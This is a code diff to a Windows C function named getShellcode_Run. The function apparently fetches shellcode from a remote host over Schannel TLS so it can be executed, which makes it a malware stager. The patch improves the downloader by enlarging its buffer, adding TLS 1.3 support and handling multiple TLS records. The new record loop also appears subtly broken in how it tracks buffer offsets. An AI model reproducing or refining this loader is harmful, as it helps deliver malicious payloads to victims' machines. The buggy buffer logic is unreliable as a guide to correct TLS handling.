@@ -22,7 +22,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     struct addrinfo *result = NULL, *ptr = NULL, hints;
     char sendbuf[MAX_PATH] = "";
     char recvbuf[DEFAULT_BUFLEN];
-    char sslBuf[16384];
+    char sslBuf[32768];  // Increased buffer size
     char *encryptedBuf = NULL;
     int iResult;
     int sslBufLen = 0;
@@ -55,6 +55,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "WSAStartup failed: %d\n", iResult);
         OutputDebugStringA(errorMsg);
+
+
         return;
     }
     OutputDebugStringA("Winsock initialized successfully\n");
@@ -121,8 +123,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     // Initialize SSL
     SCHANNEL_CRED schannelCred = {0};
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
-    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
-    schannelCred.dwFlags = 0;  // Removed SCH_CRED_MANUAL_CRED_VALIDATION for Google
+    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;  // Enable TLS 1.3
+    schannelCred.dwFlags = 0;
 
     OutputDebugStringA("Acquiring credentials handle...\n");
     secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &schannelCred, NULL, NULL, &hCred, NULL);
@@ -302,13 +304,14 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     // Receive and decrypt the response
     sslBufLen = 0;
+    int processedBytes = 0;
     do {
         OutputDebugStringA("Receiving response...\n");
         iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
         if (iResult > 0) {
             sslBufLen += iResult;
             char logMsg[256];
-            sprintf_s(logMsg, 256, "Received %d bytes of encrypted data\n", iResult);
+            sprintf_s(logMsg, 256, "Received %d bytes of encrypted data (total: %d)\n", iResult, sslBufLen);
             OutputDebugStringA(logMsg);
 
             // Log the first few bytes of the received data (in hex) for debugging
@@ -320,35 +323,45 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 OutputDebugStringA(logMsg);
             }
 
-            inBuffers[0].pvBuffer = sslBuf;
-            inBuffers[0].cbBuffer = sslBufLen;
-            inBuffers[0].BufferType = SECBUFFER_DATA;
-            inBuffers[1].BufferType = SECBUFFER_EMPTY;
-            inBuffers[1].cbBuffer = 0;
-            inBuffers[1].pvBuffer = NULL;
-            inBuffer.cBuffers = 2;
-            inBuffer.pBuffers = inBuffers;
-            inBuffer.ulVersion = SECBUFFER_VERSION;
+            // Process the buffer in a loop to handle multiple TLS records
+            processedBytes = 0;
+            while (processedBytes < sslBufLen) {
+                inBuffers[0].pvBuffer = sslBuf + processedBytes;
+                inBuffers[0].cbBuffer = sslBufLen - processedBytes;
+                inBuffers[0].BufferType = SECBUFFER_DATA;
+                inBuffers[1].BufferType = SECBUFFER_EMPTY;
+                inBuffers[1].cbBuffer = 0;
+                inBuffers[1].pvBuffer = NULL;
+                inBuffer.cBuffers = 2;
+                inBuffer.pBuffers = inBuffers;
+                inBuffer.ulVersion = SECBUFFER_VERSION;
 
-            OutputDebugStringA("Decrypting message...\n");
-            secStatus = DecryptMessage(&hContext, &inBuffer, 0, NULL);
-            if (secStatus == SEC_E_OK) {
-                int decryptedLen = inBuffers[1].cbBuffer;
-                sprintf_s(logMsg, 256, "Decrypted %d bytes\n", decryptedLen);
-                OutputDebugStringA(logMsg);
-                if (fullResponseLen + decryptedLen < sizeof(fullResponse)) {
-                    memcpy(fullResponse + fullResponseLen, inBuffers[1].pvBuffer, decryptedLen);
-                    fullResponseLen += decryptedLen;
+                OutputDebugStringA("Decrypting message...\n");
+                secStatus = DecryptMessage(&hContext, &inBuffer, 0, NULL);
+                if (secStatus == SEC_E_OK) {
+                    int decryptedLen = inBuffers[1].cbBuffer;
+                    sprintf_s(logMsg, 256, "Decrypted %d bytes\n", decryptedLen);
+                    OutputDebugStringA(logMsg);
+                    if (fullResponseLen + decryptedLen < sizeof(fullResponse)) {
+                        memcpy(fullResponse + fullResponseLen, inBuffers[1].pvBuffer, decryptedLen);
+                        fullResponseLen += decryptedLen;
+                    }
+                    // Update processed bytes
+                    processedBytes += (sslBufLen - processedBytes) - inBuffers[0].cbBuffer;
+                    // Shift remaining data to the beginning of sslBuf
+                    if (inBuffers[0].cbBuffer > 0) {
+                        memmove(sslBuf, sslBuf + processedBytes, inBuffers[0].cbBuffer);
+                    }
+                    sslBufLen = inBuffers[0].cbBuffer;
+                } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
+                    OutputDebugStringA("Incomplete message, need more data\n");
+                    break;  // Need more data
+                } else {
+                    char errorMsg[256];
+                    sprintf_s(errorMsg, 256, "DecryptMessage failed: 0x%08X\n", secStatus);
+                    OutputDebugStringA(errorMsg);
+                    goto Cleanup;
                 }
-                sslBufLen = 0;  // Reset buffer for next iteration
-            } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
-                OutputDebugStringA("Incomplete message, need more data\n");
-                continue;  // Need more data
-            } else {
-                char errorMsg[256];
-                sprintf_s(errorMsg, 256, "DecryptMessage failed: 0x%08X\n", secStatus);
-                OutputDebugStringA(errorMsg);
-                break;
             }
         } else if (iResult == 0) {
             OutputDebugStringA("Connection closed\n");
